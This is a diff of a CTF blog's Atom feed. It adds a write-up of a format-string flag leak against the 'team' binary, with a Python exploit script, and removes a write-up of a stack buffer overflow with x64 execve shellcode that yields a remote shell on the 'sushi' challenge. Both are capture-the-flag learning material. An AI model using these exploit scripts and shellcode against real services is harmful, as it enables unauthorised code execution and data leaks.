@@ -4,7 +4,7 @@
   <title><![CDATA[Category: Pwnable | staring into /dev/null]]></title>
   <link href="http://barrebas.github.io/blog/categories/pwnable/atom.xml" rel="self"/>
   <link href="http://barrebas.github.io/"/>
-  <updated>2015-03-31T07:19:17+02:00</updated>
+  <updated>2015-04-02T20:17:02+02:00</updated>
   <id>http://barrebas.github.io/</id>
   <author>
     <name><![CDATA[barrebas]]></name>
@@ -12,6 +12,105 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[Backdoor CTF - Team]]></title>
+    <link href="http://barrebas.github.io/blog/2015/04/02/backdoor-ctf-team/"/>
+    <updated>2015-04-02T19:23:27+02:00</updated>
+    <id>http://barrebas.github.io/blog/2015/04/02/backdoor-ctf-team</id>
+    <content type="html"><![CDATA[<p>Backdoor CTF was hosted on a weekday, so we only had the evening to grab as many flags as we could. Here&rsquo;s how we solved <code>team</code> for 600 points.</p>
+
+<!-- more -->
+
+
+<p>The binary we&rsquo;ve been given is a 32-bit ELF. The output of strings doesn&rsquo;t give us much. Using <code>strace ./team</code>, it becomes clear that the binary reads from <code>flag.txt</code> so I created one locally. I echoed <code>flag1</code> to the file and restarted the binary.</p>
+
+<p>It asks for a team name and a flag. After receiving these values in heap buffers (non-overflowable as far as I could gather) it proceeds to read the flag from <code>flag.txt</code>. Then, it compares the user input to the flag using <code>strcmp</code>.</p>
+
+<p>The team name is then printed using <code>printf</code>: this is vulnerable to a format string vulnerability:</p>
+
+<pre><code>bas@tritonal:~/tmp/bckdr/team-600$ ./team
+Enter teamname: TEAM%llp
+Enter flag: FLAG%llp
+TEAM0x64 : incorrect flag. Try again.
+</code></pre>
+
+<p>Okay, so let&rsquo;s have a look at the stack when we reach <code>printf</code>. It gets called at <code>8048711</code> to print the team name.</p>
+
+<pre><code>Breakpoint 1, 0x08048711 in ?? ()
+gdb-peda$ x/40wx $esp
+0xffffd510: 0x0804b008  0x00000064  0x0804b140  0x00000000
+0xffffd520: 0x00000000  0x00000000  0x0804b0d8  0x0804b008
+0xffffd530: 0x00000000  0x0804b140  0x67616c66  0x00000031
+0xffffd540: 0x00000000  0x00000000  0x00000000  0x00000000
+0xffffd550: 0x00000000  0x00000000  0x00000000  0x00000000
+0xffffd560: 0x00000000  0x00000000  0x00000000  0x00000000
+0xffffd570: 0x00000000  0x00000000  0x00000000  0x00000000
+0xffffd580: 0x00000000  0x00000000  0x00000000  0x00000000
+0xffffd590: 0x00000000  0x00000002  0x00000000  0x856b7a00
+0xffffd5a0: 0x00000000  0x00000000  0xffffd5d8  0x0804880c
+</code></pre>
+
+<p>What&rsquo;s this then? From breakpointing <code>strcmp</code>, I learned that the flag was on the stack. In fact, it&rsquo;s within reach of the format string vulnerability!</p>
+
+<pre><code>0xffffd530: 0x00000000  0x0804b140  0x67616c66  0x00000031
+                          flag1 &gt;&gt;&gt;   g a l f           1
+</code></pre>
+
+<p>That&rsquo;s too easy, right? Wrong! The flag starts at <code>%10$p</code>:</p>
+
+<pre><code class="bash">bas@tritonal:~/tmp/bckdr/team-600$ ./team
+Enter teamname: %10$p
+Enter flag: bleh
+0x67616c66 : incorrect flag. Try again.
+</code></pre>
+
+<p>It worked remotely with this script:</p>
+
+<pre><code class="python">from socket import *
+import struct, telnetlib, re, sys
+
+def readtil(delim):
+    buf = b''
+    while not delim in buf:
+        buf += s.recv(1)
+    return buf
+
+def sendln(b):
+    s.send(b + b'\n')
+
+def sendbin(b):
+    s.sendall(b)
+
+def p(x):
+    return struct.pack('&lt;L', x &amp; 0xffffffff)
+
+def pwn(n):
+    global s
+    s=socket(AF_INET, SOCK_STREAM)
+    s.connect(('hack.bckdr.in', 8004))
+
+    readtil('teamname: ')
+    sendln("AAAA%"+str(n)+"$p")
+    readtil('flag: ')
+    sendln("CTF_TEAM_VULNHUB")
+    data = readtil('again.')
+
+    s.close()
+    m = re.findall(r'0x([0-9a-f]*) :', data)
+    return m[0]
+
+full = ''
+for i in xrange(10, 30):
+    full += pwn(i).decode('hex')[::-1]
+    print full
+</code></pre>
+
+<p>This spits out the flag until it hits something it can&rsquo;t hex decode. Because the CTF is long-lived, we won&rsquo;t post any flags.</p>
+
+<p>Far too easy for a 600 point challenge, but we&rsquo;re not complaining&hellip;</p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[0ctf - Login]]></title>
@@ -1317,125 +1416,6 @@ id
 /bin//sh: 1: id: not found
 cat flag.txt
 flag{K33P_ST4T1C_L1K3_W00L_F4BR1C}
-</code></pre>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[BSides Vancouver CTF - Sushi]]></title>
-    <link href="http://barrebas.github.io/blog/2015/03/18/bsides-vancouver-ctf-sushi/"/>
-    <updated>2015-03-18T20:15:54+01:00</updated>
-    <id>http://barrebas.github.io/blog/2015/03/18/bsides-vancouver-ctf-sushi</id>
-    <content type="html"><![CDATA[<p>At the very last minute, we decided to join BSides Vancouvers&#8217; CTF. Sushi was a 100 point pwnable.</p>
-
-<!-- more -->
-
-
-<p>We&rsquo;re given the binary (and the libraries are available if need be &ndash; really nice, no guessing). Upon running it, it gives us some address and asks for money:</p>
-
-<pre><code class="bash">Deposit money for sushi here: 0x7ffc068ccfe0
-aaaaaaaa
-Sorry, $0.97 is not enough.
-</code></pre>
-
-<p>It seems to take the first character <code>a</code> (0x61 or 97) and use that. After fruitlessly trying to trigger a format string vulnerability, I disassembled the binary and checked out it in <code>gdb-peda</code>.</p>
-
-<pre><code class="bash">gdb-peda$ checksec
-CANARY    : disabled
-FORTIFY   : disabled
-NX        : disabled
-PIE       : disabled
-RELRO     : disabled
-</code></pre>
-
-<p>Okay, no protections whatsoever. This means that the stack is executable too. The idea of string format vulnerability was quickly replaced with a good old buffer overflow:</p>
-
-<pre><code class="bash">bas@tritonal:~/tmp/yvrctf/sushi-100$ python -c 'print "".join(["%04d" % x for x in range(200)])' | ./sushi
-Deposit money for sushi here: 0x7ffd0aa1edb0
-Sorry, $0.48 is not enough.
-Segmentation fault (core dumped)
-bas@tritonal:~/tmp/yvrctf/sushi-100$ gdb ./sushi core
-...snip...
-Core was generated by `./sushi'.
-Program terminated with signal 11, Segmentation fault.
-#0  0x00000000004005f2 in ?? ()
-gdb-peda$ x/i $rip
-=&gt; 0x4005f2:    ret    
-gdb-peda$ x/2wx $rsp
-0x7ffd0aa1edf8: 0x38313030  0x39313030
-</code></pre>
-
-<p>Upon supplying a large buffer, the program crashes. Apparently, the saved return address is overwritten with <code>00180019</code>, so now I had the offset. The program crashes upon executing the <code>ret</code> statement at <code>0x4005f2</code> because the address does not point to a valid memory location.</p>
-
-<pre><code class="bash">bas@tritonal:~/tmp/yvrctf/sushi-100$ python -c 'print "A"*(18*4)+"BBBBCCCC"' | ./sushi
-Deposit money for sushi here: 0x7ffdcfd360b0
-Sorry, $0.65 is not enough.
-Segmentation fault (core dumped)
-bas@tritonal:~/tmp/yvrctf/sushi-100$ gdb ./sushi core
-...snip...
-Core was generated by `./sushi'.
-Program terminated with signal 11, Segmentation fault.
-#0  0x00000000004005f2 in ?? ()
-gdb-peda$ x/2wx $rsp
-0x7ffdcfd360f8: 0x42424242  0x43434343
-gdb-peda$ x/s 0x7ffdcfd360b0
-0x7ffdcfd360b0:  'A' &lt;repeats 72 times&gt;, "BBBBCCCC"
-</code></pre>
-
-<p>What&rsquo;s more, each time upon running <code>sushi</code>, the program supplies the address of the buffer it is using! In other words, that&rsquo;s a nice place for shellcode!</p>
-
-<p>The program uses <code>gets()</code> to get the input:</p>
-
-<pre><code class="bash">0x4005c5:  call  0x400480 &lt;gets@plt&gt;
-</code></pre>
-
-<p>This means that we can send null bytes, which we need to overwrite the saved return address with the address of our buffer. These things together (and the fact that the vulnerable binary is ran on a remote box) meant that it had to be run from a <code>socat</code> process:</p>
-
-<pre><code class="bash">$ socat TCP-LISTEN:4000,fork,reuseaddr EXEC:./sushi
-</code></pre>
-
-<p>Next was writing a simple exploit in python:</p>
-
-<pre><code class="python">from socket import *
-import struct, telnetlib, re
-
-def p(x):
-    return struct.pack('&lt;L', x)
-
-def pQ(x):
-    return struct.pack('&lt;Q', x)
-
-s=socket(AF_INET, SOCK_STREAM)
-#s.connect(('localhost', 4000))
-s.connect(('sushi.termsec.net', 4000))
-
-buf = s.recv(1000)
-stack_addr = int(re.search('(0x[0-9a-f]+)', buf).group(1), 16)
-
-print "[~] stack addr: 0x%lx" % stack_addr
-
-# simple x64 execve shellcode
-shellcode = "\x31\xc0\48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05"
-# payload must overflow saved return address on stack
-payload = shellcode + "A" * (72 - len(shellcode))
-# we're given the address of our (executable!) buffer on the stack, so use that as return address
-payload += pQ(stack_addr) + "\n"
-
-s.send(payload)
-
-t = telnetlib.Telnet()
-t.sock = s
-t.interact()
-s.close()
-</code></pre>
-
-<p>It ran locally after a bit of fine-tuning, so the proof was in the pudding:</p>
-
-<pre><code class="bash">bas@tritonal:~/tmp/yvrctf/sushi-100$ python ./sushi.py 
-[~] stack addr: 0x7fffb3fc0480
-Sorry, $0.49 is not enough.
-cat flag.txt
-flag{I_l3ft_my_wallet_in_#irc}
 </code></pre>
 ]]></content>
   </entry>
